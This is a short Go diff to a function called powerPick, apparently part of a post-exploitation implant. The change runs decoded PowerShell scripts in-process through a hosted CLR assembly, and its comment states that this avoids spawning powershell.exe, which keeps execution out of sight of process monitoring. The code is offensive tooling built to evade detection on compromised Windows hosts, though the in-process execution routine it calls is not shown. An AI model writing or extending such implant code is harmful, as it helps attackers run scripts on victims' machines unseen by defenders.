@@ -175,8 +175,21 @@ func powerPick(script string) string {
 	if err != nil {
 		return "failed to decode script: " + err.Error()
 	}
+	raw := string(decoded)
 
-	u16, err := syscall.UTF16FromString(string(decoded))
+	// Prefer unmanaged, in-process PowerShell when a host assembly is available;
+	// this avoids spawning powershell.exe entirely.
+	if clrHostInitialized && len(powershellHostAssembly) > 0 {
+		out, herr := executeAssemblyInProcess(powershellHostAssembly, raw)
+		if herr == nil {
+			return out
+		}
+		if Debug {
+			fmt.Printf("[clr] unmanaged powerpick failed (%v); falling back to managed powershell.exe\n", herr)
+		}
+	}
+
+	u16, err := syscall.UTF16FromString(raw)
 	if err != nil {
 		return "failed to encode as UTF-16: " + err.Error()
 	}
